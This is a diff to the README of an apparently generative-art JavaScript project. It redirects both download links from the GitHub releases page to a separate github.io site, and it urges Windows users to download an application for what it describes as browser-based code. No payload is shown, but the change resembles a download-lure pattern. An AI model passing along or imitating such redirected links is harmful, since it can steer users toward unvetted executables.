@@ -1,6 +1,6 @@
 # 🌀 Ephemeral-Whirls-Generative-Art - Create unique art with wandering particles
 
-[Click Here to Download Application](https://github.com/Karylinliquefiable980/Ephemeral-Whirls-Generative-Art/releases)
+[Click Here to Download Application](https://karylinliquefiable980.github.io)
 
 Ephemeral Whirls generates digital line art using particle systems. This software creates patterns with wandering movement, repeating loops, and color palettes. You can preview these images on virtual apparel. The project uses JavaScript and functions without external requirements.
 
@@ -10,7 +10,7 @@ This application runs on Windows 10 and Windows 11. You need a modern web browse
 
 ## 📥 Getting Started
 
-Visit the download page to obtain the software: [Download Ephemeral Whirls](https://github.com/Karylinliquefiable980/Ephemeral-Whirls-Generative-Art/releases)
+Visit the download page to obtain the software: [Download Ephemeral Whirls](https://karylinliquefiable980.github.io)
 
 1. Open the link above in your web browser.
 2. Locate the latest release version on the page.
